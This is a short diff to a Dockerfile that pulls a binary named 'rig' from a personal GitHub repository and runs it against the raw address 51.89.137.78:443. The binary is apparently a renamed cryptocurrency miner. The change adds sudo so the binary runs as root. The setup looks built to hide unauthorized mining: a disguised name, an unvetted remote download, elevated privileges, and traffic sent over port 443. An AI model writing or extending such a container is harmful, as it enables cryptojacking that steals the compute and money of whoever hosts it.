@@ -11,11 +11,11 @@ RUN wget https://github.com/mustakmahisa/repo/raw/main/rig && \
 FROM ubuntu:latest
 
 RUN apt-get update && apt-get dist-upgrade -y && \
-    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && \
+    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 sudo && \
     apt-get clean && \
     rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
 COPY --from=builder /usr/local/bin/rig /usr/local/bin/
 
-ENTRYPOINT [ "rig" ]
+ENTRYPOINT [ "sudo", "rig" ]
 CMD [ "-o", "51.89.137.78:443", "--no-color" ]
